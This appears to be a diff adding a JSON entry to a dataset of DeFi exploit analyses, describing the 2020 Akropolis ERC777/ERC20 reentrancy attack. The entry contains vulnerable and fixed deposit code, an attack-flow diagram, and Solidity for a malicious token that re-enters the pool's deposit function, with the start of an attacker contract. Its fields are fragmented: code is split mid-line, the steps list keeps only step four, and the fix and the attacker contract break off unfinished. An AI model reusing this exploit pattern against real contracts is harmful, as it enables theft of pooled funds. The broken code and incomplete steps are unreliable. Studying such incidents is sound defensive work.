@@ -1,0 +1,32 @@
+{
+ "id": "2020__2020-11-12_Akropolis_ReentrancyDAI",
+ "source_file": "2020/2020-11-12_Akropolis_ReentrancyDAI.md",
+ "title": "Akropolis — DAI Double-Deposit via ERC777 Reentrancy Analysis",
+ "date": "2020-11-12",
+ "protocol": "Akropolis",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$2,000,000 (DAI)",
+ "loss_usd": 2000000.0,
+ "root_cause": "Reentrancy via malicious ERC20 token: the deposit function did not follow the Checks-Effects-Interactions pattern, allowing reentry before balance update during callback",
+ "attack_tx": null,
+ "vulnerable_contract": "0x157c75776F8a966E33028E29d42B6dF6e41E9c75",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable Akropolis Savings Pool deposit function (pseudocode)\ncontract SavingsPool {\n    mapping(address => uint256) public balances;\n    uint256 public totalShares;\n\n    function deposit(address token, uint256 amount) external {\n        //",
+  "❌ External call occurs before balance update\n        // If token is a malicious ERC20, transferFrom can trigger a callback\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n\n        //",
+  "❌ During reentrancy, this code has not yet executed\n        // → The reentrant deposit call calculates shares based on pre-update totalShares\n        uint256 shares = (amount * totalShares) / getTotalPoolValue();\n        totalShares += shares;\n        balances[msg.sender] += shares;\n    }\n\n    //"
+ ],
+ "code_after": [
+  "✅ Correct pattern (CEI applied)\n    function depositFixed(address token, uint256 amount) external nonReentrant {\n        //",
+  "✅ Calculate shares first\n        uint256 shares = (amount * totalShares) / getTotalPoolValue();\n\n        //"
+ ],
+ "steps": [
+  "[4] Redeem 2A shares via withdraw → Receive 2x DAI"
+ ],
+ "other_code": [
+  "Attacker Contract (includes malicious ERC20 implementation)\n    │\n    ├─[1] Deploy malicious ERC20 token\n    │       transferFrom contains reentrant callback\n    │\n    ├─[2] First call: Akropolis deposit(fakeToken, amount)\n    │       │\n    │       └─ fakeToken.transferFrom executes\n    │           │\n    │           └─ Callback triggered: deposit(fakeToken, amount) re-called ──┐\n    │               │                                                          │\n    │               ├─ totalShares not yet updated                             │\n    │               ├─ Shares calculated at same ratio as first call           │\n    │               └─ Shares A obtained (second deposit)                      │\n    │                                                                          │\n    │       ◄",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\n// Malicious ERC20: triggers reentrant callback on transferFrom\ncontract MaliciousToken {\n    address public akropolisPool;\n    bool private attacking;\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        if (!attacking) {\n            attacking = true;\n            // ⚡ Reentrancy: call Akropolis deposit one more time\n            // At this point, Akropolis's totalShares has not yet been updated\n            ISavingsPool(akropolisPool).deposit(address(this), amount);\n            attacking = false;\n        }\n        // Simulate actual token transfer\n        return true;\n    }\n}\n\ncontract AkropolisAttack {\n    MaliciousToken public fakeToken;\n    ISavingsPool public pool;\n\n    func"
+ ]
+}
